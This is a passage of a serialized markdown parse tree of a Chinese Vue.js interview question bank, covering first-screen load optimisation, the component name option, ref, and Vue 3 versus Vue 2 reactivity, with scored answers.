15. vue 中的 spa 应用如何优化首屏加载速度?\\n\\n","depth":2,"text":"15. vue 中的 spa 应用如何优化首屏加载速度?","tokens":[{"type":"text","raw":"15. vue 中的 spa 应用如何优化首屏加载速度?","text":"15. vue 中的 spa 应用如何优化首屏加载速度?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"* 请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。\\n\\n* 缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验\\n\\n* gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。\\n\\n* http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。\\n\\n* 懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件\\n\\n* 预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化\\n\\n* 合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积\\n\\n* 使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化\\n\\n* 提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程\\n\\n* 封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化\\n\\n* 图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验\\n\\n* 使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。\\n\\n","task":false,"loose":true,"text":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。\\n","tokens":[{"type":"text","raw":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。\\n","text":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。","tokens":[{"type":"text","raw":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。","text":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。","escaped":false}]}]},{"type":"list_item","raw":"* 缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验\\n\\n","task":false,"loose":true,"text":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验\\n","tokens":[{"type":"text","raw":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验\\n","text":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验","tokens":[{"type":"text","raw":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验","text":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验","escaped":false}]}]},{"type":"list_item","raw":"* gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。\\n\\n","task":false,"loose":true,"text":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。\\n","tokens":[{"type":"text","raw":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。\\n","text":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。","tokens":[{"type":"text","raw":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。","text":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。","escaped":false}]}]},{"type":"list_item","raw":"* http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。\\n\\n","task":false,"loose":true,"text":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。\\n","tokens":[{"type":"text","raw":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。\\n","text":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。","tokens":[{"type":"text","raw":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。","text":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。","escaped":false}]}]},{"type":"list_item","raw":"* 懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件\\n\\n","task":false,"loose":true,"text":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件\\n","tokens":[{"type":"text","raw":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件\\n","text":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件","tokens":[{"type":"text","raw":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件","text":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件","escaped":false}]}]},{"type":"list_item","raw":"* 预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化\\n\\n","task":false,"loose":true,"text":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化\\n","tokens":[{"type":"text","raw":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化\\n","text":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化","tokens":[{"type":"text","raw":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化","text":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化","escaped":false}]}]},{"type":"list_item","raw":"* 合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积\\n\\n","task":false,"loose":true,"text":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积\\n","tokens":[{"type":"text","raw":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积\\n","text":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积","tokens":[{"type":"text","raw":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积","text":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积","escaped":false}]}]},{"type":"list_item","raw":"* 使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化\\n\\n","task":false,"loose":true,"text":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化\\n","tokens":[{"type":"text","raw":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化\\n","text":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化","tokens":[{"type":"text","raw":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化","text":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化","escaped":false}]}]},{"type":"list_item","raw":"* 提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程\\n\\n","task":false,"loose":true,"text":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程\\n","tokens":[{"type":"text","raw":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程\\n","text":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程","tokens":[{"type":"text","raw":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程","text":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程","escaped":false}]}]},{"type":"list_item","raw":"* 封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化\\n\\n","task":false,"loose":true,"text":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化\\n","tokens":[{"type":"text","raw":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化\\n","text":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化","tokens":[{"type":"text","raw":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化","text":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化","escaped":false}]}]},{"type":"list_item","raw":"* 图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验\\n\\n","task":false,"loose":true,"text":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验\\n","tokens":[{"type":"text","raw":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验\\n","text":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验","tokens":[{"type":"text","raw":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验","text":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验","escaped":false}]}]},{"type":"list_item","raw":"* 使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","task":false,"loose":true,"text":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","tokens":[{"type":"text","raw":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","text":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","tokens":[{"type":"text","raw":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","text":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 16. 组件中写 name 选项有哪些好处？\\n\\n","depth":2,"text":"16. 组件中写 name 选项有哪些好处？","tokens":[{"type":"text","raw":"16. 组件中写 name 选项有哪些好处？","text":"16. 组件中写 name 选项有哪些好处？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* 可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）\\n\\n* 可以通过 name 属性实现缓存功能（keep-alive）\\n\\n* 可以通过 name 来识别组件（跨级组件通信时非常重要）\\n\\n* 使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）\\n\\n","task":false,"loose":true,"text":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）\\n","tokens":[{"type":"text","raw":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）\\n","text":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）","tokens":[{"type":"text","raw":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）","text":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）","escaped":false}]}]},{"type":"list_item","raw":"* 可以通过 name 属性实现缓存功能（keep-alive）\\n\\n","task":false,"loose":true,"text":"可以通过 name 属性实现缓存功能（keep-alive）\\n","tokens":[{"type":"text","raw":"可以通过 name 属性实现缓存功能（keep-alive）\\n","text":"可以通过 name 属性实现缓存功能（keep-alive）","tokens":[{"type":"text","raw":"可以通过 name 属性实现缓存功能（keep-alive）","text":"可以通过 name 属性实现缓存功能（keep-alive）","escaped":false}]}]},{"type":"list_item","raw":"* 可以通过 name 来识别组件（跨级组件通信时非常重要）\\n\\n","task":false,"loose":true,"text":"可以通过 name 来识别组件（跨级组件通信时非常重要）\\n","tokens":[{"type":"text","raw":"可以通过 name 来识别组件（跨级组件通信时非常重要）\\n","text":"可以通过 name 来识别组件（跨级组件通信时非常重要）","tokens":[{"type":"text","raw":"可以通过 name 来识别组件（跨级组件通信时非常重要）","text":"可以通过 name 来识别组件（跨级组件通信时非常重要）","escaped":false}]}]},{"type":"list_item","raw":"* 使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","task":false,"loose":true,"text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","tokens":[{"type":"text","raw":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","tokens":[{"type":"text","raw":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 17. 说一下 ref 的作用是什么？\\n\\n","depth":2,"text":"17. 说一下 ref 的作用是什么？","tokens":[{"type":"text","raw":"17. 说一下 ref 的作用是什么？","text":"17. 说一下 ref 的作用是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：","text":"ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：","tokens":[{"type":"text","raw":"ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：","text":"ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* 如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素\\n\\n* 基本用法，本页面获取 DOM 元素\\n\\n* 获取子组件中的 data\\n\\n* 调用子组件中的方法\\n\\n* 使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素\\n\\n","task":false,"loose":true,"text":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素\\n","tokens":[{"type":"text","raw":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素\\n","text":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素","tokens":[{"type":"text","raw":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素","text":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素","escaped":false}]}]},{"type":"list_item","raw":"* 基本用法，本页面获取 DOM 元素\\n\\n","task":false,"loose":true,"text":"基本用法，本页面获取 DOM 元素\\n","tokens":[{"type":"text","raw":"基本用法，本页面获取 DOM 元素\\n","text":"基本用法，本页面获取 DOM 元素","tokens":[{"type":"text","raw":"基本用法，本页面获取 DOM 元素","text":"基本用法，本页面获取 DOM 元素","escaped":false}]}]},{"type":"list_item","raw":"* 获取子组件中的 data\\n\\n","task":false,"loose":true,"text":"获取子组件中的 data\\n","tokens":[{"type":"text","raw":"获取子组件中的 data\\n","text":"获取子组件中的 data","tokens":[{"type":"text","raw":"获取子组件中的 data","text":"获取子组件中的 data","escaped":false}]}]},{"type":"list_item","raw":"* 调用子组件中的方法\\n\\n","task":false,"loose":true,"text":"调用子组件中的方法\\n","tokens":[{"type":"text","raw":"调用子组件中的方法\\n","text":"调用子组件中的方法","tokens":[{"type":"text","raw":"调用子组件中的方法","text":"调用子组件中的方法","escaped":false}]}]},{"type":"list_item","raw":"* 使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","task":false,"loose":true,"text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","tokens":[{"type":"text","raw":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","tokens":[{"type":"text","raw":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 18. 谈谈你对 Vue 3 Composition API 中响应式原理的理解，以及它与 Vue 2.x 中响应式原理的区别\\n\\n","depth":2,"text":"18. 谈谈你对 Vue 3 Composition API 中响应式原理的理解，以及它与 Vue 2.x 中响应式原理的区别","tokens":[{"type":"text","raw":"18. 谈谈你对 Vue 3 Composition API 中响应式原理的理解，以及它与 Vue 2.x 中响应式原理的区别","text":"18. 谈谈你对 Vue 3 Composition API 中响应式原理的理解，以及它与 Vue 2.x 中响应式原理的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"list","raw":"* **1：** Vue 3 使用 ES6 的 Proxy 对象来实现响应式，它可以直接代理整个对象，而不仅仅是对象的属性。例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** Vue 3 使用 ES6 的 Proxy 对象来实现响应式，它可以直接代理整个对象，而不仅仅是对象的属性。例如：","task":false,"loose":false,"text":"**1：** Vue 3 使用 ES6 的 Proxy 对象来实现响应式，它可以直接代理整个对象，而不仅仅是对象的属性。例如：","tokens":[{"type":"text","raw":"**1：** Vue 3 使用 ES6 的 Proxy 对象来实现响应式，它可以直接代理整个对象，而不仅仅是对象的属性。例如：","text":"**1：** Vue 3 使用 ES6 的 Proxy 对象来实现响应式，它可以直接代理整个对象，而不仅仅是对象的属性。例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vue 3 使用 ES6 的 Proxy 对象来实现响应式，它可以直接代理整个对象，而不仅仅是对象的属性。例如：","text":" Vue 3 使用 ES6 的 Proxy 对象来实现响应式，它可以直接代理整个对象，而不仅仅是对象的属性。例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst state = reactive({ count: 0 });\\n//Proxy 能对对象的所有操作进行拦截，包括属性的读取、设置、删除等，从而实现更精准的响应式追踪。\\n```","lang":"js","text":"const state = reactive({ count: 0 });\\n//Proxy 能对对象的所有操作进行拦截，包括属性的读取、设置、删除等，从而实现更精准的响应式追踪。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** 对比 Vue 2.x 使用的 Object.defineProperty () 方法，它只能对对象的已有属性进行逐个劫持，对于新增属性需要使用Vue.set方法来手动触发响应式更新。\\n* **1：** 在 Vue 3 中，通过reactive创建的响应式对象是深层响应式的，而 Vue 2.x 中对象内部嵌套的对象，需要递归遍历进行深度响应式转换。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 对比 Vue 2.x 使用的 Object.defineProperty () 方法，它只能对对象的已有属性进行逐个劫持，对于新增属性需要使用Vue.set方法来手动触发响应式更新。\\n","task":false,"loose":false,"text":"**1：** 对比 Vue 2.x 使用的 Object.defineProperty () 方法，它只能对对象的已有属性进行逐个劫持，对于新增属性需要使用Vue.set方法来手动触发响应式更新。","tokens":[{"type":"text","raw":"**1：** 对比 Vue 2.x 使用的 